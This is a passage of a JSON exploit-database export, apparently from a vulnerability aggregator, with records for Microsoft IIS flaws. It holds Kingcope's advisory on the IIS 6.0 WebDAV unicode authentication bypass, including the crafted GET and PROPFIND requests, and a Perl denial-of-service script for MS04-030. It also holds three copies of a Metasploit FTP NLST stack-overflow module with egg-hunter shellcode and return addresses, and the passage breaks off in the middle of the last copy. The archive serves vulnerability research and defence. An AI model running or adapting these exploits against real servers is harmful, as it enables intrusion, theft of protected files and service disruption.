            "vhref": "https://vulners.com/metasploit/MSF:AUXILIARY/SCANNER/HTTP/MS09_020_WEBDAV_UNICODE_BYPASS"
        },
        {
            "bulletinFamily": "exploit",
            "description": "Microsoft IIS 6.0 WebDAV Remote Authentication Bypass Vulnerability. CVE-2009-1535,CVE-2009-1676. Remote exploit for windows platform",
            "modified": "2009-05-15T00:00:00",
            "published": "2009-05-15T00:00:00",
            "id": "EDB-ID:8704",
            "href": "https://www.exploit-db.com/exploits/8704/",
            "type": "exploitdb",
            "title": "Microsoft IIS 6.0 WebDAV - Remote Authentication Bypass Vulnerability",
            "sourceData": "                                              ####                    \r\n                #                            #####                    \r\n               ####            #             #####                    \r\n              #######         ###           ######                    \r\n                #######      ######       #######                     \r\n                 #########   #######     ########                     \r\n                 #####################  #########                     \r\n                  #### #########  ########## ####                     \r\n                  ####   ######    #######   ####                     \r\n                  ####     ####      ####    ####                     \r\n                   ####                #    #####                     \r\n                   ########    ######       ######                    \r\n                   ###############################                    \r\n    # ####          ##############################                    \r\n    #######      ##             #      ##                             \r\n     ######     #####      ### ##      ####                           \r\n      #####    #####       ########    ####      #######       ##     \r\n      #####    ####     #  #########   ####     #################     \r\n      ####    #####   ####  ########   ####    ##################     \r\n    #######  #####    ####  #########  ####   #####         #####     \r\n   #################  ####  #### ####  ####  #####    #####           \r\n      ##############  ####  #### ##### ##########     #############   \r\n      ####      #####  #### ####  #### ##########     ############    \r\n      ####       ##### #########  #### ####  #####            ####    \r\n      ####        ######### ####   ########   ####            ####    \r\n      #####        #############   ########   #####     ###########   \r\n      #####         ####### ####    #######    ####################   \r\n      ##### #####   ##              #######     ############ #####    \r\n      ####  ###########           #     ##       ######         #     \r\n            ##############   ##  ##############    #############      \r\n           #####    ###### ##### ################# #############      \r\n          #####            ######     ############   ####             \r\n        ######         # #########    ####    ####  ####              \r\n       #####         ########  ####  #####    ####  ###########       \r\n      #####          ######     ##################  ###########       \r\n     #####            #####      ################# ############       \r\n     #######       #########    ###########  ####  ####               \r\n        ############### #############  ####      ########             \r\n          #############  ##########    ####     ################      \r\n            ####          ######       ###       ###############      \r\n                           #                                 ###  \r\n\r\narchive: https://github.com/offensive-security/exploit-database-bin-sploits/raw/master/sploits/8704.pdf (2009-IIS-Advisory.pdf)\r\n\r\n   *** FOR IMMEDIATE RELEASE *** *** FOR IMMEDIATE RELEASE ***\r\n\r\nMicrosoft IIS 6.0 WebDAV Remote Authentication Bypass\r\n\r\nDiscovered by Kingcope - May 12th, 2009\r\n\r\n\r\nAffected Vendors\r\n\r\n      Microsoft\r\n\r\nAffected Products\r\n\r\n      Web Server\r\n\r\nVulnerability Details\r\n\r\nThis vulnerability allows remote attackers to bypass access restrictions\r\non vulnerable installations of Internet Information Server 6.0. The\r\nspecific flaw exists within the WebDAV functionality of IIS 6.0. The Web\r\nServer fails to properly handle unicode tokens when parsing the URI and\r\nsending back data. Exploitation of this issue can result in the\r\nfollowing:\r\n\r\n         Authentication bypass of password protected folders\r\n         Listing, downloading and uploading of files into a password protected WebDAV folder\r\n\r\nAuthentication bypass of password protected folders\r\n\r\nAssume there is a password protected folder in\r\n\u00e2\u20ac\u017ed:\\inetpub\\wwwroot\\protected\\\u00e2\u20ac\u0153. The password protection mechanism is\r\nnot relevant for the attack to work. Inside this folder there is a file\r\nnamed \u00e2\u20ac\u017eprotected.zip\u00e2\u20ac\u0153\r\n\r\nThe attacker sends a HTTP GET request to the web server.\r\n\r\n         GET /  %c0%af/protected/protected.zip HTTP/1.1\r\n         Translate: f\r\n         Connection: close\r\n         Host: servername\r\n\r\nAs seen above the URI contains the unicode character '/' (%c0%af). This\r\nunicode character is removed in a WebDAV request. \u00e2\u20ac\u017eTranslate: f\u00e2\u20ac\u0153\r\ninstructs the web server to handle the request using WebDAV. Using this\r\nmalicious URI construct the webserver sends the file located at\r\n\u00e2\u20ac\u017e/protected/protected.zip\u00e2\u20ac\u0153 back to the attacker without asking for\r\nproper authentication. Another valid request an attacker might send to\r\nthe web server is:\r\n\r\n         GET /prot%c0%afected/protected.zip HTTP/1.1\r\n         Translate: f\r\n         Connection: close\r\n         Host: servername\r\n\r\nIIS 6.0 will remove the \u00e2\u20ac\u017e%c0%af\u00e2\u20ac\u0153 unicode character internally from the\r\nrequest and send back the password protected file without asking for\r\nproper credentials. ASP scripts cannot be downloaded in this way unless\r\nserving of script source-code is enabled.\r\n\r\nListing files in a password protected WebDAV folder\r\n\r\nThe attack on WebDAV folders is similar. The attacker can bypass the\r\naccess restrictions of the password protected folder and list, download,\r\nupload and modify files. The attacker sends a PROPFIND request to the\r\nweb server.\r\n\r\n        PROPFIND /protec%c0%afted/ HTTP/1.1\r\n        Host: servername\r\n        User-Agent: neo/0.12.2\r\n        Connection: TE\r\n        TE: trailers\r\n        Depth: 1\r\n        Content-Length: 288\r\n        Content-Type: application/xml\r\n        <?xml version=\"1.0\" encoding=\"utf-8\"?>\r\n        <propfind xmlns=\"DAV:\"><prop>\r\n        <getcontentlength xmlns=\"DAV:\"/>\r\n        <getlastmodified xmlns=\"DAV:\"/>\r\n        <executable xmlns=\"http://apache.org/dav/props/\"/>\r\n        <resourcetype xmlns=\"DAV:\"/>\r\n        <checked-in xmlns=\"DAV:\"/>\r\n        <checked-out xmlns=\"DAV:\"/>\r\n        </prop></propfind>\r\n\r\nIIS responds with the directory listing of the folder without asking for a password.\r\n\r\nCredit\r\n\r\nThis vulnerability was discovered by:\r\n        Nikolaos Rangos\r\n        Contact: kcope2@googlemail.com\r\n        Greetings to: alex and andi\r\n\r\n# milw0rm.com [2009-05-15]\r\n",
            "cvss": {
                "score": 7.6,
                "vector": "AV:NETWORK/AC:HIGH/Au:NONE/C:COMPLETE/I:COMPLETE/A:COMPLETE/"
            },
            "vhref": "https://vulners.com/exploitdb/EDB-ID:8704"
        }
    ],
    "CVE-2003-0718": [
        {
            "bulletinFamily": "exploit",
            "description": "MS Windows IIS WebDAV XML Denial of Service Exploit (MS04-030). CVE-2003-0718. Dos exploit for windows platform",
            "modified": "2004-10-20T00:00:00",
            "published": "2004-10-20T00:00:00",
            "id": "EDB-ID:585",
            "href": "https://www.exploit-db.com/exploits/585/",
            "type": "exploitdb",
            "title": "Microsoft Windows IIS - WebDAV XML Denial of Service Exploit MS04-030",
            "sourceData": "#!/usr/bin/perl\r\n# IIS BlowOut \r\n# POC exploit for MS04-030. Found by Amit Klein. \r\n# incognito_ergo yahoo com\r\n# usage: perl ms04-030_spl.pl host port\r\n\r\nuse IO::Socket;\r\n\r\n$port = @ARGV[1];\r\n$host = @ARGV[0];\r\n\r\n\r\n$socket = IO::Socket::INET->new(PeerAddr => $host,PeerPort => \r\n$port,Proto => \"TCP\");\r\n\r\n\r\nfor ($count=1; $count<9999; $count++) #more than nuff\r\n{\r\n\r\n$xmlatt = $xmlatt. \"xmlns:z\" . $count . \"=\\\"xml:\\\" \"; \r\n\r\n}\r\n\r\n\r\n\r\n$xmldata = \"<?xml version=\\\"1.0\\\"?>\\r\\n<a:propfind xmlns:a=\\\"DAV:\\\" \" . \r\n$xmlatt . \r\n\">\\r\\n<a:prop><a:getcontenttype/></a:prop>\\r\\n</a:propfind>\\r\\n\\r\\n\";\r\n\r\n$l=length($xmldata);\r\n\r\n$req=\"PROPFIND / HTTP/1.1\\nContent-type: text/xml\\nHost: \r\n$host\\nContent-length: $l\\n\\n$xmldata\\n\\n\"; \r\n\r\nsyswrite($socket,$req,length($req));\r\n\r\nclose $socket;\n\n# milw0rm.com [2004-10-20]\n",
            "cvss": {
                "score": 5.0,
                "vector": "AV:NETWORK/AC:LOW/Au:NONE/C:NONE/I:NONE/A:PARTIAL/"
            },
            "vhref": "https://vulners.com/exploitdb/EDB-ID:585"
        }
    ],
    "CVE-2008-0075": [
        {
            "bulletinFamily": "exploit",
            "description": "BUGTRAQ  ID: 27676\r\nCVE(CAN) ID: CVE-2008-0075\r\n\r\nMicrosoft Internet\u4fe1\u606f\u670d\u52a1\uff08IIS\uff09\u662fMicrosoft Windows\u81ea\u5e26\u7684\u4e00\u4e2a\u7f51\u7edc\u4fe1\u606f\u670d\u52a1\u5668\uff0c\u5176\u4e2d\u5305\u542bHTTP\u670d\u52a1\u529f\u80fd\u3002\r\n\r\nIIS\u5904\u7406ASP\u7f51\u9875\u8f93\u5165\u7684\u65b9\u5f0f\u5b58\u5728\u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\u6f0f\u6d1e\uff0c\u5141\u8bb8\u653b\u51fb\u8005\u5411\u7f51\u7ad9\u7684ASP\u9875\u9762\u4f20\u9001\u6076\u610f\u8f93\u5165\u3002\u6210\u529f\u5229\u7528\u8fd9\u4e2a\u6f0f\u6d1e\u7684\u653b\u51fb\u8005\u53ef\u4ee5\u5728IIS\u670d\u52a1\u5668\u4e0a\u4ee5WPI\u7684\u6743\u9650\uff08\u9ed8\u8ba4\u914d\u7f6e\u4e3a\u7f51\u7edc\u670d\u52a1\u5e10\u53f7\u6743\u9650\uff09\u6267\u884c\u4efb\u610f\u64cd\u4f5c\u3002\r\n\r\n\n\nMicrosoft IIS 6.0\r\nMicrosoft IIS 5.1\n \u4e34\u65f6\u89e3\u51b3\u65b9\u6cd5\uff1a\r\n\r\n* \u5728Windows Server 2003\u4e0a\u7981\u7528\u4f20\u7edf\u98ce\u683cASP\uff1a\r\n    \r\n1. \u70b9\u51fb\u201c\u5f00\u59cb\u201d\u3001\u201c\u7ba1\u7406\u5de5\u5177\u201d\u3001\u201cInternet\u4fe1\u606f\u670d\u52a1(IIS)\u7ba1\u7406\u5668\u201d\r\n2. \u70b9\u51fb\u670d\u52a1\u5668\u540d\u79f0\u8fb9\u7684\u52a0\u53f7\uff0c\u7136\u540e\u70b9\u51fb\u201cWeb\u670d\u52a1\u6269\u5c55\u201d\u6587\u4ef6\u5939\r\n3. \u5728\u53f3\u4fa7\u680f\u4e2d\u70b9\u51fb\u9ad8\u4eae\u9009\u62e9\u201cActive Server Pages\u201d\u7136\u540e\u70b9\u51fb\u201c\u7981\u6b62\u201d\r\n\r\n\u5382\u5546\u8865\u4e01\uff1a\r\n\r\nMicrosoft\r\n---------\r\nMicrosoft\u5df2\u7ecf\u4e3a\u6b64\u53d1\u5e03\u4e86\u4e00\u4e2a\u5b89\u5168\u516c\u544a\uff08MS08-006\uff09\u4ee5\u53ca\u76f8\u5e94\u8865\u4e01:\r\nMS08-006\uff1aVulnerability in Internet Information Services Could Allow Remote Code Execution (942830)\r\n\u94fe\u63a5\uff1a<a href=http://www.microsoft.com/technet/security/Bulletin/MS08-006.mspx?pf=true target=_blank>http://www.microsoft.com/technet/security/Bulletin/MS08-006.mspx?pf=true</a>",
            "modified": "2008-02-20T00:00:00",
            "published": "2008-02-20T00:00:00",
            "href": "https://www.seebug.org/vuldb/ssvid-2903",
            "id": "SSV:2903",
            "title": "Microsoft IIS ASP\u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\u6f0f\u6d1e\uff08MS08-006\uff09",
            "type": "seebug",
            "sourceData": "",
            "cvss": {
                "score": 10.0,
                "vector": "AV:NETWORK/AC:LOW/Au:NONE/C:COMPLETE/I:COMPLETE/A:COMPLETE/"
            },
            "vhref": "https://vulners.com/seebug/SSV:2903"
        }
    ],
    "CVE-2009-3023": [
        {
            "bulletinFamily": "exploit",
            "description": "Microsoft IIS FTP Server NLST Response Overflow. CVE-2009-3023. Remote exploit for windows platform",
            "modified": "2010-11-12T00:00:00",
            "published": "2010-11-12T00:00:00",
            "id": "EDB-ID:16740",
            "href": "https://www.exploit-db.com/exploits/16740/",
            "type": "exploitdb",
            "title": "Microsoft IIS FTP Server NLST Response Overflow",
            "sourceData": "##\r\n# $Id: ms09_053_ftpd_nlst.rb 11003 2010-11-12 06:19:49Z hdm $\r\n##\r\n\r\n##\r\n# This file is part of the Metasploit Framework and may be subject to\r\n# redistribution and commercial restrictions. Please see the Metasploit\r\n# Framework web site for more information on licensing and terms of use.\r\n# http://metasploit.com/framework/\r\n##\r\n\r\nrequire 'msf/core'\r\n\r\nclass Metasploit3 < Msf::Exploit::Remote\r\n\tRank = GreatRanking\r\n\r\n\tinclude Msf::Exploit::Remote::Ftp\r\n\r\n\tdef initialize(info = {})\r\n\t\tsuper(update_info(info,\r\n\t\t\t'Name'           => 'Microsoft IIS FTP Server NLST Response Overflow',\r\n\t\t\t'Description'    => %q{\r\n\t\t\t\t\tThis module exploits a stack buffer overflow flaw in the Microsoft IIS FTP\r\n\t\t\t\tservice. The flaw is triggered when a special NLST argument is passed\r\n\t\t\t\twhile the session has changed into a long directory path. For this exploit\r\n\t\t\t\tto work, the FTP server must be configured to allow write access to the\r\n\t\t\t\tfile system (either anonymously or in conjunction with a real account)\r\n\t\t\t},\r\n\t\t\t'Author'         => [ 'Kingcope <kcope2[at]googlemail.com>', 'hdm' ],\r\n\t\t\t'License'        => MSF_LICENSE,\r\n\t\t\t'Version'        => '$Revision: 11003 $',\r\n\t\t\t'References'     =>\r\n\t\t\t\t[\r\n\t\t\t\t\t['URL', 'http://milw0rm.com/exploits/9541'],\r\n\t\t\t\t\t['CVE', '2009-3023'],\r\n\t\t\t\t\t['OSVDB', '57589'],\r\n\t\t\t\t\t['BID', '36189'],\r\n\t\t\t\t\t['MSB', 'MS09-053'],\r\n\t\t\t\t],\r\n\t\t\t'DefaultOptions' =>\r\n\t\t\t\t{\r\n\t\t\t\t\t'EXITFUNC' => 'process',\r\n\t\t\t\t},\r\n\t\t\t'Privileged'     => true,\r\n\t\t\t'Payload'        =>\r\n\t\t\t\t{\r\n\t\t\t\t\t'Space'    => 490,\r\n\t\t\t\t\t'BadChars' => \"\\x00\\x09\\x0c\\x20\\x0a\\x0d\\x0b\",\r\n\t\t\t\t\t# This is for the stored payload, the real BadChar list for file paths is:\r\n\t\t\t\t\t# \\x01\\x02\\x03\\x04\\x05\\x06\\x07\\x08\\x09\\x0a\\x0b\\x0c\\x0d\\x0e\\x0f\\x10\\x11\\x12\\x13\\x14\\x15\\x16\\x17\\x18\\x19\\x1a\\x1b\\x1c\\x1d\\x1e\\x1f\\x20\\x22\\x2a\\x2e\\x2f\\x3a\\x3c\\x3e\\x3f\\x5c\\x7c\r\n\t\t\t\t\t'StackAdjustment' => -3500,\r\n\t\t\t\t},\r\n\t\t\t'Platform'       => [ 'win' ],\r\n\t\t\t'Targets'        =>\r\n\t\t\t\t[\r\n\t\t\t\t\t[\r\n\t\t\t\t\t\t'Windows 2000 SP4 English/Italian (IIS 5.0)',\r\n\t\t\t\t\t\t{\r\n\t\t\t\t\t\t\t'Ret'      => 0x773d24eb,  # jmp esp in activeds.dll (English / 5.0.2195.6601)\r\n\t\t\t\t\t\t\t'Patch'    => 0x7ffd7ffd   # works for off-by-two alignment\r\n\t\t\t\t\t\t},\r\n\t\t\t\t\t],\r\n\t\t\t\t\t[\r\n\t\t\t\t\t\t'Windows 2000 SP3 English (IIS 5.0)',\r\n\t\t\t\t\t\t{\r\n\t\t\t\t\t\t\t'Ret'      => 0x77e42ed8,  # jmp esp in user32.dll (English / 5.0.2195.7032)\r\n\t\t\t\t\t\t\t'Patch'    => 0x7ffd7ffd   # works for off-by-two alignment\r\n\t\t\t\t\t\t},\r\n\t\t\t\t\t],\r\n\t\t\t\t\t[\r\n\t\t\t\t\t\t# target from TomokiSanaki\r\n\t\t\t\t\t\t'Windows 2000 SP0-SP3 Japanese (IIS 5.0)',\r\n\t\t\t\t\t\t{\r\n\t\t\t\t\t\t\t'Ret'      => 0x774fa593,  # jmp esp in ?? (Japanese)\r\n\t\t\t\t\t\t\t'Patch'    => 0x7ffd7ffd   # works for off-by-two alignment\r\n\t\t\t\t\t\t},\r\n\t\t\t\t\t],\r\n\t\t\t\t],\r\n\t\t\t'DisclosureDate' => 'Aug 31 2009',\r\n\t\t\t'DefaultTarget' => 0))\r\n\r\n\t\tregister_options([Opt::RPORT(21),], self.class)\r\n\tend\r\n\r\n\r\n\tdef exploit\r\n\t\tconnect_login\r\n\r\n\r\n\t\tbased = rand_text_alpha_upper(10)\r\n\r\n\t\tres   = send_cmd( ['MKD', based ], true )\r\n\t\tprint_status(res.strip)\r\n\r\n\t\tif (res !~ /directory created/)\r\n\t\t\tprint_error(\"The root directory of the FTP server is not writeable\")\r\n\t\t\tdisconnect\r\n\t\t\treturn\r\n\t\tend\r\n\r\n\t\tres   = send_cmd( ['CWD', based ], true )\r\n\t\tprint_status(res.strip)\r\n\r\n\t\tegg = rand_text_alpha_upper(4)\r\n\t\thun = \"\\xB8\\x55\\x55\\x52\\x55\\x35\\x55\\x55\\x55\\x55\\x40\\x81\\x38#{egg}\\x75\\xF7\\x40\\x40\\x40\\x40\\xFF\\xE0\"\r\n\r\n\t\t# This egg hunter is necessary because of the huge set of restricted characters for directory names\r\n\t\t# The best that metasploit could so was 133 bytes for an alphanum encoded egg hunter\r\n\t\t# The egg hunter above was written by kcope and searches from 0x70000 forward (stack) in order\r\n\t\t# to locate the real shellcode. The only change from the original hunter was to randomize the\r\n\t\t# prefix used.\r\n\r\n\t\t# Store our real shellcode on the stack\r\n\t\t1.upto(5) do\r\n\t\t\tres = send_cmd( ['SITE', egg + payload.encoded.gsub(\"\\xff\", \"\\xff\\xff\") ], true )\r\n\t\tend\r\n\r\n\t\t# Create the directory path that will be used in the overflow\r\n\t\tpre = rand_text_alpha_upper(3)              # esp+0x28 points here\r\n\t\tpst = rand_text_alpha_upper(210)            # limited by max path\r\n\r\n\t\tpst[  0, hun.length]  = hun                 # egg hunter\r\n\t\tpst[ 90,  4]  = [target['Patch']].pack('V') # patch smashed pointers\r\n\t\tpst[ 94,  4]  = [target['Patch']].pack('V')\t# patch smashed pointers\r\n\t\tpst[140, 32]  = [target['Patch']].pack('V') * 8  # patch smashed pointers\r\n\t\tpst[158,  4]  = [target.ret].pack(\"V\")      # return\r\n\t\tpst[182,  5]  = \"\\xe9\" + [-410].pack(\"V\")   # jmp back\r\n\r\n\t\t# Escape each 0xff with another 0xff for FTP\r\n\t\tpst = pst.gsub(\"\\xff\", \"\\xff\\xff\")\r\n\r\n\t\tprint_status(\"Creating long directory...\")\r\n\t\tres   = send_cmd( ['MKD', pre+pst ], true )\r\n\t\tprint_status(res.strip)\r\n\r\n\t\tsrv\t  = Rex::Socket::TcpServer.create(\r\n\t\t\t'LocalHost' => '0.0.0.0',\r\n\t\t\t'LocalPort' =>  0,\r\n\t\t\t'SSL'       => false,\r\n\t\t\t'Context'   => {\r\n\t\t\t\t\t'Msf'        => framework,\r\n\t\t\t\t\t'MsfExploit' => self,\r\n\t\t\t}\r\n\t\t)\r\n\r\n\t\tadd_socket(srv)\r\n\r\n\t\tbegin\r\n\r\n\t\tthr = framework.threads.spawn(\"Module(#{self.refname})-Listener\", false) { srv.accept }\r\n\r\n\t\t\tprt   = srv.getsockname[2]\r\n\t\t\tprt1  = prt / 256\r\n\t\t\tprt2  = prt % 256\r\n\r\n\t\t\taddr  = Rex::Socket.source_address(rhost).gsub(\".\", \",\") + \",#{prt1},#{prt2}\"\r\n\r\n\t\t\tres   = send_cmd( ['PORT', addr ], true )\r\n\t\t\tprint_status(res.strip)\r\n\r\n\t\t\tprint_status(\"Trying target #{target.name}...\")\r\n\r\n\t\t\tres   = send_cmd( ['NLST', pre+pst + \"*/../\" + pre + \"*/\"], true )\r\n\t\t\tprint_status(res.strip) if res\r\n\r\n\t\t\tselect(nil,nil,nil,2)\r\n\r\n\t\t\thandler\r\n\t\t\tdisconnect\r\n\r\n\t\tensure\r\n\t\t\tthr.kill\r\n\t\t\tsrv.close\r\n\r\n\t\tend\r\n\tend\r\n\r\nend\r\n\r\n",
            "cvss": {
                "score": 9.3,
                "vector": "AV:NETWORK/AC:MEDIUM/Au:NONE/C:COMPLETE/I:COMPLETE/A:COMPLETE/"
            },
            "vhref": "https://vulners.com/exploitdb/EDB-ID:16740"
        },
        {
            "bulletinFamily": "exploit",
            "description": "",
            "modified": "2010-10-06T00:00:00",
            "published": "2010-10-06T00:00:00",
            "href": "https://packetstormsecurity.com/files/94532/Microsoft-IIS-FTP-Server-NLST-Response-Overflow.html",
            "id": "PACKETSTORM:94532",
            "type": "packetstorm",
            "title": "Microsoft IIS FTP Server NLST Response Overflow",
            "sourceData": "`##  \n# $Id: ms09_053_ftpd_nlst.rb 10558 2010-10-05 23:39:14Z jduck $  \n##  \n  \n##  \n# This file is part of the Metasploit Framework and may be subject to  \n# redistribution and commercial restrictions. Please see the Metasploit  \n# Framework web site for more information on licensing and terms of use.  \n# http://metasploit.com/framework/  \n##  \n  \nrequire 'msf/core'  \n  \nclass Metasploit3 < Msf::Exploit::Remote  \nRank = GreatRanking  \n  \ninclude Msf::Exploit::Remote::Ftp  \n  \ndef initialize(info = {})  \nsuper(update_info(info,  \n'Name' => 'Microsoft IIS FTP Server NLST Response Overflow',  \n'Description' => %q{  \nThis module exploits a stack buffer overflow flaw in the Microsoft IIS FTP  \nservice. The flaw is triggered when a special NLST argument is passed  \nwhile the session has changed into a long directory path. For this exploit  \nto work, the FTP server must be configured to allow write access to the  \nfile system (either anonymously or in conjunction with a real account)  \n},  \n'Author' => [ 'Kingcope <kcope2[at]googlemail.com>', 'hdm' ],  \n'License' => MSF_LICENSE,  \n'Version' => '$Revision: 10558 $',  \n'References' =>  \n[  \n['URL', 'http://milw0rm.com/exploits/9541'],  \n['CVE', '2009-3023'],  \n['OSVDB', '57589'],  \n['BID', '36189'],  \n['MSB', 'MS09-053'],  \n],  \n'DefaultOptions' =>  \n{  \n'EXITFUNC' => 'process',  \n},  \n'Privileged' => true,  \n'Payload' =>  \n{  \n'Space' => 490,  \n'BadChars' => \"\\x00\\x09\\x0c\\x20\\x0a\\x0d\\x0b\",  \n# This is for the stored payload, the real BadChar list for file paths is:  \n# \\x01\\x02\\x03\\x04\\x05\\x06\\x07\\x08\\x09\\x0a\\x0b\\x0c\\x0d\\x0e\\x0f\\x10\\x11\\x12\\x13\\x14\\x15\\x16\\x17\\x18\\x19\\x1a\\x1b\\x1c\\x1d\\x1e\\x1f\\x20\\x22\\x2a\\x2e\\x2f\\x3a\\x3c\\x3e\\x3f\\x5c\\x7c  \n'StackAdjustment' => -3500,  \n},  \n'Platform' => [ 'win' ],  \n'Targets' =>  \n[  \n[  \n'Windows 2000 SP4 English/Italian (IIS 5.0)',  \n{  \n'Ret' => 0x773d24eb, # jmp esp in activeds.dll (English / 5.0.2195.6601)  \n'Patch' => 0x7ffd7ffd # works for off-by-two alignment  \n},  \n],  \n[  \n'Windows 2000 SP3 English (IIS 5.0)',  \n{  \n'Ret' => 0x77e42ed8, # jmp esp in user32.dll (English / 5.0.2195.7032)  \n'Patch' => 0x7ffd7ffd # works for off-by-two alignment  \n},  \n],  \n[  \n# target from TomokiSanaki  \n'Windows 2000 SP0-SP3 Japanese (IIS 5.0)',  \n{  \n'Ret' => 0x774fa593, # jmp esp in ?? (Japanese)  \n'Patch' => 0x7ffd7ffd # works for off-by-two alignment  \n},  \n],  \n],  \n'DisclosureDate' => 'Aug 31 2009',  \n'DefaultTarget' => 0))  \n  \nregister_options([Opt::RPORT(21),], self.class)  \nend  \n  \n  \ndef exploit  \nconnect_login  \n  \n  \nbased = rand_text_alpha_upper(10)  \n  \nres = send_cmd( ['MKD', based ], true )  \nprint_status(res.strip)  \n  \nif (res !~ /directory created/)  \nprint_error(\"The root directory of the FTP server is not writeable\")  \ndisconnect  \nreturn  \nend  \n  \nres = send_cmd( ['CWD', based ], true )  \nprint_status(res.strip)  \n  \negg = rand_text_alpha_upper(4)  \nhun = \"\\xB8\\x55\\x55\\x52\\x55\\x35\\x55\\x55\\x55\\x55\\x40\\x81\\x38#{egg}\\x75\\xF7\\x40\\x40\\x40\\x40\\xFF\\xE0\"  \n  \n# This egg hunter is necessary because of the huge set of restricted characters for directory names  \n# The best that metasploit could so was 133 bytes for an alphanum encoded egg hunter  \n# The egg hunter above was written by kcope and searches from 0x70000 forward (stack) in order  \n# to locate the real shellcode. The only change from the original hunter was to randomize the  \n# prefix used.  \n  \n# Store our real shellcode on the stack  \n1.upto(5) do  \nres = send_cmd( ['SITE', egg + payload.encoded.gsub(\"\\xff\", \"\\xff\\xff\") ], true )  \nend  \n  \n# Create the directory path that will be used in the overflow  \npre = rand_text_alpha_upper(3) # esp+0x28 points here  \npst = rand_text_alpha_upper(210) # limited by max path  \n  \npst[ 0, hun.length] = hun # egg hunter  \npst[ 90, 4] = [target['Patch']].pack('V') # patch smashed pointers  \npst[ 94, 4] = [target['Patch']].pack('V') # patch smashed pointers  \npst[140, 32] = [target['Patch']].pack('V') * 8 # patch smashed pointers  \npst[158, 4] = [target.ret].pack(\"V\") # return  \npst[182, 5] = \"\\xe9\" + [-410].pack(\"V\") # jmp back  \n  \n# Escape each 0xff with another 0xff for FTP  \npst = pst.gsub(\"\\xff\", \"\\xff\\xff\")  \n  \nprint_status(\"Creating long directory...\")  \nres = send_cmd( ['MKD', pre+pst ], true )  \nprint_status(res.strip)  \n  \nsrv = Rex::Socket::TcpServer.create(  \n'LocalHost' => '0.0.0.0',  \n'LocalPort' => 0,  \n'SSL' => false,  \n'Context' => {  \n'Msf' => framework,  \n'MsfExploit' => self,  \n}  \n)  \n  \nadd_socket(srv)  \n  \nbegin  \n  \nthr = Thread.new { srv.accept }  \n  \nprt = srv.getsockname[2]  \nprt1 = prt / 256  \nprt2 = prt % 256  \n  \naddr = Rex::Socket.source_address(rhost).gsub(\".\", \",\") + \",#{prt1},#{prt2}\"  \n  \nres = send_cmd( ['PORT', addr ], true )  \nprint_status(res.strip)  \n  \nprint_status(\"Trying target #{target.name}...\")  \n  \nres = send_cmd( ['NLST', pre+pst + \"*/../\" + pre + \"*/\"], true )  \nprint_status(res.strip) if res  \n  \nselect(nil,nil,nil,2)  \n  \nhandler  \ndisconnect  \n  \nensure  \nthr.kill  \nsrv.close  \n  \nend  \nend  \n  \nend  \n  \n`\n",
            "cvss": {
                "score": 9.3,
                "vector": "AV:NETWORK/AC:MEDIUM/Au:NONE/C:COMPLETE/I:COMPLETE/A:COMPLETE/"
            },
            "vhref": "https://vulners.com/packetstorm/PACKETSTORM:94532"
        },
        {
            "bulletinFamily": "exploit",
            "description": "This module exploits a stack buffer overflow flaw in the Microsoft IIS FTP service. The flaw is triggered when a special NLST argument is passed while the session has changed into a long directory path. For this exploit to work, the FTP server must be configured to allow write access to the file system (either anonymously or in conjunction with a real account)\n",
            "modified": "2017-07-24T13:26:21",
            "published": "2010-10-05T23:39:14",
            "id": "MSF:EXPLOIT/WINDOWS/FTP/MS09_053_FTPD_NLST",
            "href": "",
            "type": "metasploit",
            "title": "MS09-053 Microsoft IIS FTP Server NLST Response Overflow",
            "sourceData": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = GreatRanking\n\n  include Msf::Exploit::Remote::Ftp\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'MS09-053 Microsoft IIS FTP Server NLST Response Overflow',\n      'Description'    => %q{\n          This module exploits a stack buffer overflow flaw in the Microsoft IIS FTP\n        service. The flaw is triggered when a special NLST argument is passed\n        while the session has changed into a long directory path. For this exploit\n        to work, the FTP server must be configured to allow write access to the\n        file system (either anonymously or in conjunction with a real account)\n      },\n      'Author'         => [ 'Kingcope <kcope2[at]googlemail.com>', 'hdm' ],\n      'License'        => MSF_LICENSE,\n      'References'     =>\n        [\n          ['EDB', '9541'],\n          ['CVE', '2009-3023'],\n          ['OSVDB', '57589'],\n          ['BID', '36189'],\n          ['MSB', 'MS09-053'],\n        ],\n      'DefaultOptions' =>\n        {\n          'EXITFUNC' => 'process',\n        },\n      'Privileged'     => true,\n      'Payload'        =>\n        {\n          'Space'    => 490,\n          'BadChars' => \"\\x00\\x09\\x0c\\x20\\x0a\\x0d\\x0b\",\n          # This is for the stored payload, the real BadChar list for file paths is:\n          # \\x01\\x02\\x03\\x04\\x05\\x06\\x07\\x08\\x09\\x0a\\x0b\\x0c\\x0d\\x0e\\x0f\\x10\\x11\\x12\\x13\\x14\\x15\\x16\\x17\\x18\\x19\\x1a\\x1b\\x1c\\x1d\\x1e\\x1f\\x20\\x22\\x2a\\x2e\\x2f\\x3a\\x3c\\x3e\\x3f\\x5c\\x7c\n          'StackAdjustment' => -3500,\n        },\n      'Platform'       => [ 'win' ],\n      'Targets'        =>\n        [\n          [\n            'Windows 2000 SP4 English/Italian (IIS 5.0)',\n            {\n              'Ret'      => 0x773d24eb,  # jmp esp in activeds.dll (English / 5.0.2195.6601)\n              'Patch'    => 0x7ffd7ffd   # works for off-by-two alignment\n            },\n          ],\n          [\n            'Windows 2000 SP3 English (IIS 5.0)',\n            {\n              'Ret'      => 0x77e42ed8,  # jmp esp in user32.dll (English / 5.0.2195.7032)\n              'Patch'    => 0x7ffd7ffd   # works for off-by-two alignment\n            },\n          ],\n          [\n            # target from TomokiSanaki\n            'Windows 2000 SP0-SP3 Japanese (IIS 5.0)',\n            {\n              'Ret'      => 0x774fa593,  # jmp esp in ?? (Japanese)\n              'Patch'    => 0x7ffd7ffd   # works for off-by-two alignment\n            },\n          ],\n        ],\n      'DisclosureDate' => 'Aug 31 2009',\n      'DefaultTarget' => 0))\n\n    register_options([Opt::RPORT(21),])\n  end\n\n\n  def exploit\n    connect_login\n\n\n    based = rand_text_alpha_upper(10)\n\n    res   = send_cmd( ['MKD', based ], true )\n    print_status(res.strip)\n\n    if (res !~ /directory created/)\n      print_error(\"The root directory of the FTP server is not writeable\")\n      disconnect\n      return\n    end\n\n    res   = send_cmd( ['CWD', based ], true )\n    print_status(res.strip)\n\n    egg = rand_text_alpha_upper(4)\n    hun = 